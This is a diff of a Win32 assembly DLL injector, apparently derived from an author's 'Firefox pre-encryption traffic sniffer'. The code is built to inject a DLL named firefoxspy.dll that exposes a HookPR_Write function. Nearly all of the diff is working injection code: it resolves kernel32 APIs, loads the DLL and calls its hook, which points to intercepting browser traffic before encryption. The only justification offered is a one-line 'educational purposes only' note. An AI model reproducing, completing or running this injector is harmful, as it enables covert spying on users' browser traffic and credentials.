@@ -1,4 +1,4 @@
-; +++[ firefighter.asm by h4lf-jiffie (dohmatob elvis dopgima): win32 firefox pre-encryption traffic sniffer ]+++
+; +++[ kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): a smart win32 DLL-injector ]+++
 ; Tested OK on 7 and xp
 
 ; /!\ This is for educationally purposes only, ripped straight-outta my daily ramblings. But that's besides the point ..
@@ -125,7 +125,8 @@ dll_business:
     call        [edi+0x4*3]     ; GetModuleHandleA(dll path)
     test        eax,eax
     jz          load_dll
-    jmp         before_unloading_dll
+    ;jmp         before_unloading_dll
+    jmp         quit
     
 load_dll:
     call        get_address_of_useful_kernel32dll_APIs
@@ -143,25 +144,25 @@ after_loading_dll:
     call        [edi]
     jmp         quit
     
-before_unloading_dll:
-    push        eax             ; save
-    mov         edx,eax
-    call        load_useful_dll_APIs
-    call        get_address_of_useful_dll_APIs
-    pop         edi
-    call        [edi+0x4]
-    pop         eax             ; restore
-    int3
-    
-unload_dll:
-    call        get_address_of_useful_kernel32dll_APIs
-    pop         edi
-    push        0x0
-    push        eax             ; dll handle returned by GetModuleHandleA
-    int3
-    call        [edi+0x4*2]     ; FreeLibraryAndExitThread(dll handle,0)
-    int3
-    jmp         quit
+;before_unloading_dll:
+;    push        eax             ; save
+;    mov         edx,eax
+;    call        load_useful_dll_APIs
+;    call        get_address_of_useful_dll_APIs
+;    pop         edi
+;    call        [edi+0x4]
+;    pop         eax             ; restore
+;    int3
+;    
+;unload_dll:
+;    call        get_address_of_useful_kernel32dll_APIs
+;    pop         edi
+;    push        0x0
+;    push        eax             ; dll handle returned by GetModuleHandleA
+;    int3
+;    call        [edi+0x4*2]     ; FreeLibraryAndExitThread(dll handle,0)
+;    int3
+;    jmp         quit
    
 load_useful_dll_APIs:
     call        get_address_of_useful_dll_APIs
@@ -213,7 +214,6 @@ load_APIs_end:
     ret				; j ==> [edi - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
     
 error:
-    int3
 				; this is just a stub
     call        get_address_of_useful_kernel32dll_APIs
     pop         edi
@@ -256,16 +256,14 @@ get_address_of_useful_kernel32dll_APIs:
 get_address_of_dll_path:
     pop         esi
     call        esi
-    db "C:\\users\\rude-boi\\Documents\\Visual Studio 2010\\Projects\\firefoxspy\\Release\\firefoxspy.dll"
+    db "firefoxspy.dll"         ; or what you will
     db 0x0
     
 get_address_of_useful_dll_APIs:
     pop         esi
     call        esi
     db 0x0
-    db "HookPR_Write"
-    db 0x0
-    db "UnhookPR_Write"
+    db "HookPR_Write"           ; or some other API exported by your DLL
     db 0x0
     db 0x0
     
